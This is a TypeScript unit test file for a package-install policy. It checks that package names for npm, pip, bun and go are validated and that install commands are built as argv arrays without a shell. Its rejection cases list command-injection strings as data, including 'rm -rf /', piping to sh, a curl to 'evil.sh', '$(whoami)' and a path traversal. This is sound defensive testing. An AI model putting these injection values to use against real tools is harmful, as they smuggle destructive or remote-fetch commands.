import { describe, it } from 'node:test';
import { strict as assert } from 'node:assert';
import {
  MANAGER_FOR_RUNTIME,
  basePackageName,
  installCommand,
  isValidPackageName,
  uninstallCommand,
} from '../../src/modules/servers/package-policy.ts';

/**
 * The package manager's contract with the security model: only an exact
 * package-name syntax reaches the runtime, and the command is always a fixed
 * argv array (never a shell string).
 */
describe('package name validation', () => {
  it('accepts ordinary, scoped and versioned npm names', () => {
    assert.equal(isValidPackageName('npm', 'express'), true);
    assert.equal(isValidPackageName('npm', 'lodash.merge'), true);
    assert.equal(isValidPackageName('npm', '@scope/pkg'), true);
    assert.equal(isValidPackageName('npm', 'express@4.18.2'), true);
    assert.equal(isValidPackageName('npm', '  express  '.trim()), true);
    assert.equal(isValidPackageName('bun', 'zod'), true);
  });

  it('rejects flags, separators and shell metacharacters', () => {
    for (const bad of [
      '--global',
      '-g',
      'express; rm -rf /',
      'express && curl evil.sh',
      'express | sh',
      '$(whoami)',
      '`id`',
      'express > /etc/passwd',
      'a b c',
      '',
      'x'.repeat(215),
    ]) {
      assert.equal(isValidPackageName('npm', bad), false, `must reject ${JSON.stringify(bad)}`);
    }
  });

  it('rejects scope separators used as separators', () => {
    assert.equal(isValidPackageName('npm', 'express/../../etc'), false);
    assert.equal(isValidPackageName('npm', '@scope/'), false);
  });

  it('validates pip names', () => {
    assert.equal(isValidPackageName('pip', 'requests'), true);
    assert.equal(isValidPackageName('pip', 'requests>=2.31.0'), true);
    assert.equal(isValidPackageName('pip', 'Flask'), true);
    assert.equal(isValidPackageName('pip', 'requests; rm -rf /'), false);
    assert.equal(isValidPackageName('pip', '-r requirements.txt'), false);
  });

  it('validates go module paths', () => {
    assert.equal(isValidPackageName('go', 'github.com/gin-gonic/gin'), true);
    assert.equal(isValidPackageName('go', 'github.com/gin-gonic/gin@v1.9.1'), true);
    assert.equal(isValidPackageName('go', 'express'), false);
    assert.equal(isValidPackageName('go', 'rm -rf /'), false);
  });
});

describe('commands are argv arrays, never shell strings', () => {
  it('builds a fixed npm install', () => {
    assert.deepEqual(installCommand('npm', 'express'), ['npm', 'install', '--no-audit', '--no-fund', '--loglevel', 'error', 'express']);
    assert.deepEqual(uninstallCommand('npm', 'express'), ['npm', 'uninstall', '--no-audit', '--no-fund', '--loglevel', 'error', 'express']);
  });

  it('uses the manager of the runtime', () => {
    assert.deepEqual(installCommand('bun', 'zod'), ['bun', 'add', 'zod']);
    assert.deepEqual(installCommand('pip', 'requests'), ['pip', 'install', '--user', '--no-input', 'requests']);
    assert.deepEqual(uninstallCommand('pip', 'requests'), ['pip', 'uninstall', '--user', '--yes', 'requests']);
    assert.deepEqual(installCommand('go', 'github.com/gin-gonic/gin'), ['go', 'get', 'github.com/gin-gonic/gin']);
  });

  it('never contains a shell', () => {
    for (const argv of [installCommand('npm', 'express'), installCommand('pip', 'requests')]) {
      assert.ok(!argv.some((a) => a.includes('sh -c')));
      assert.equal(argv.length > 1, true, 'a command plus at least one argument');
    }
  });
});

describe('runtime → manager mapping', () => {
  it('only maps the runtimes that actually have one', () => {
    assert.equal(MANAGER_FOR_RUNTIME['Node.js'], 'npm');
    assert.equal(MANAGER_FOR_RUNTIME.Bun, 'bun');
    assert.equal(MANAGER_FOR_RUNTIME.Python, 'pip');
    assert.equal(MANAGER_FOR_RUNTIME.PHP, null, 'PHP ships no composer in these images');
  });
});

describe('base name comparison', () => {
  it('strips version selectors so lists and removals match', () => {
    assert.equal(basePackageName('npm', 'express@4.18.2'), 'express');
    assert.equal(basePackageName('npm', '@scope/pkg@^1.0.0'), '@scope/pkg');
    assert.equal(basePackageName('pip', 'Requests>=2.31'), 'requests');
    assert.equal(basePackageName('go', 'github.com/gin-gonic/gin@v1.9.1'), 'github.com/gin-gonic/gin');
  });
});
